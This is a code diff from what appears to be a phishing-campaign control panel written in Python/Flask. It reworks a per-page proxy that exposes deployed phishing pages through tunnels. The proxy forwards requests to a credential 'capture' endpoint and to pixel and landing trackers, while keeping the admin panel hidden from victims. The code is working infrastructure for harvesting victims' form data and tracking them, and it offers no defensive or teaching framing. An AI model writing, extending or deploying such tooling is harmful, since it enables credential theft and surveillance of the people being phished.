@@ -199,85 +199,116 @@ def api_jobs():
     with proc_lock:
         return jsonify({'active': list(active_procs.keys())})
 
-# ── Public-service proxy (isolates phishing pages from admin panel) ───────────
-_pub_proxy_srv  = None
-_pub_proxy_port = None
-_pub_proxy_lock = threading.Lock()
+# ── Public-service proxy ──────────────────────────────────────────────────────
+# Architecture: admin panel stays on :5000 (private).
+# Each deployed service gets an isolated proxy on a chosen port (default 8080)
+# that only forwards the specific page path and its capture endpoints.
+# Tunnels point to the proxy port, never to :5000.
+#
+# Allowed through proxy:
+#   /p/<page_id>          — the deployed phishing page
+#   /api/phish/capture    — form/JS payload data collection
+#   /api/phish/px/<id>    — pixel tracker
+#   /api/phish/land/<id>  — landing tracker
+#
+# Everything else (admin panel, API routes, other pages) → 403.
 
-_PUB_ALLOWED = ('/p/', '/api/phish/capture', '/api/phish/px/', '/api/phish/land/')
+_pub_proxies     = {}   # port → {'srv': HTTPServer, 'page_id': str}
+_pub_proxy_lock  = threading.Lock()
 
-class _PubProxyHandler(BaseHTTPRequestHandler):
-    def _allowed(self):
-        return any(self.path.startswith(a) for a in _PUB_ALLOWED)
+def _make_proxy_handler(page_id):
+    """Return a request handler class locked to a specific page_id."""
+    allowed_exact  = ('/api/phish/capture',)
+    allowed_prefix = (f'/p/{page_id}', f'/api/phish/px/', f'/api/phish/land/')
 
-    def _forward(self):
-        if not self._allowed():
-            self.send_response(403)
-            self.send_header('Content-Type', 'text/plain; charset=utf-8')
-            self.end_headers()
-            self.wfile.write(b'403 Forbidden - admin panel is not exposed via this proxy.')
-            return
-        try:
-            length = int(self.headers.get('Content-Length', 0))
-            body   = self.rfile.read(length) if length > 0 else None
-            skip   = {'host', 'connection', 'transfer-encoding'}
-            hdrs   = {k: v for k, v in self.headers.items() if k.lower() not in skip}
-            req = urllib.request.Request(
-                f'http://127.0.0.1:5000{self.path}',
-                data=body, headers=hdrs, method=self.command
-            )
-            with urllib.request.urlopen(req, timeout=30) as resp:
-                self.send_response(resp.status)
-                skip_resp = {'transfer-encoding', 'connection'}
-                for k, v in resp.headers.items():
-                    if k.lower() not in skip_resp:
-                        self.send_header(k, v)
+    class Handler(BaseHTTPRequestHandler):
+        def _allowed(self):
+            p = self.path.split('?')[0]
+            return p in allowed_exact or any(p.startswith(a) for a in allowed_prefix)
+
+        def _forward(self):
+            if not self._allowed():
+                self.send_response(403)
+                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                 self.end_headers()
-                self.wfile.write(resp.read())
-        except urllib.error.HTTPError as e:
-            self.send_response(e.code)
-            self.end_headers()
-            try: self.wfile.write(e.read())
-            except: pass
-        except Exception as ex:
-            self.send_response(502)
-            self.end_headers()
-            self.wfile.write(f'Proxy error: {ex}'.encode())
+                self.wfile.write(b'403 Forbidden')
+                return
+            try:
+                length = int(self.headers.get('Content-Length', 0))
+                body   = self.rfile.read(length) if length > 0 else None
+                skip_req = {'host', 'connection', 'transfer-encoding'}
+                hdrs  = {k: v for k, v in self.headers.items()
+                         if k.lower() not in skip_req}
+                req = urllib.request.Request(
+                    f'http://127.0.0.1:5000{self.path}',
+                    data=body, headers=hdrs, method=self.command
+                )
+                with urllib.request.urlopen(req, timeout=30) as resp:
+                    self.send_response(resp.status)
+                    skip_resp = {'transfer-encoding', 'connection'}
+                    for k, v in resp.headers.items():
+                        if k.lower() not in skip_resp:
+                            self.send_header(k, v)
+                    self.end_headers()
+                    self.wfile.write(resp.read())
+            except urllib.error.HTTPError as e:
+                self.send_response(e.code)
+                self.end_headers()
+                try: self.wfile.write(e.read())
+                except: pass
+            except Exception as ex:
+                self.send_response(502)
+                self.end_headers()
+                self.wfile.write(f'Proxy error: {ex}'.encode())
 
-    do_GET = do_POST = _forward
-    def log_message(self, *a): pass
+        do_GET = do_POST = _forward
+        def log_message(self, *a): pass
+
+    return Handler
 
 @app.route('/api/public/start', methods=['POST'])
 def api_public_start():
-    global _pub_proxy_srv, _pub_proxy_port
-    data = request.json or {}
-    port = int(data.get('port', 8080))
+    data    = request.json or {}
+    port    = int(data.get('port', 8080))
+    page_id = data.get('page_id', '')
     with _pub_proxy_lock:
-        if _pub_proxy_srv:
-            _pub_proxy_srv.shutdown()
-            _pub_proxy_srv = None
+        # Stop existing proxy on this port if any
+        existing = _pub_proxies.get(port)
+        if existing:
+            existing['srv'].shutdown()
+            del _pub_proxies[port]
+        if not page_id:
+            return jsonify({'error': 'page_id required'}), 400
         try:
-            srv = HTTPServer(('0.0.0.0', port), _PubProxyHandler)
-            _pub_proxy_port = port
-            _pub_proxy_srv  = srv
+            handler = _make_proxy_handler(page_id)
+            srv = HTTPServer(('0.0.0.0', port), handler)
+            _pub_proxies[port] = {'srv': srv, 'page_id': page_id}
             threading.Thread(target=srv.serve_forever, daemon=True).start()
-            return jsonify({'ok': True, 'port': port})
+            return jsonify({'ok': True, 'port': port, 'page_id': page_id})
         except Exception as e:
             return jsonify({'error': str(e)}), 500
 
 @app.route('/api/public/stop', methods=['POST'])
 def api_public_stop():
-    global _pub_proxy_srv, _pub_proxy_port
+    data = request.json or {}
+    port = data.get('port')
     with _pub_proxy_lock:
-        if _pub_proxy_srv:
-            _pub_proxy_srv.shutdown()
-            _pub_proxy_srv  = None
-            _pub_proxy_port = None
+        if port:
+            entry = _pub_proxies.pop(int(port), None)
+            if entry: entry['srv'].shutdown()
+        else:
+            # Stop all
+            for entry in list(_pub_proxies.values()):
+                entry['srv'].shutdown()
+            _pub_proxies.clear()
     return jsonify({'ok': True})
 
 @app.route('/api/public/status')
 def api_public_status():
-    return jsonify({'running': _pub_proxy_srv is not None, 'port': _pub_proxy_port})
+    with _pub_proxy_lock:
+        services = [{'port': p, 'page_id': v['page_id']}
+                    for p, v in _pub_proxies.items()]
+    return jsonify({'running': len(services) > 0, 'services': services})
 
 @app.route('/api/is_root')
 def api_is_root():
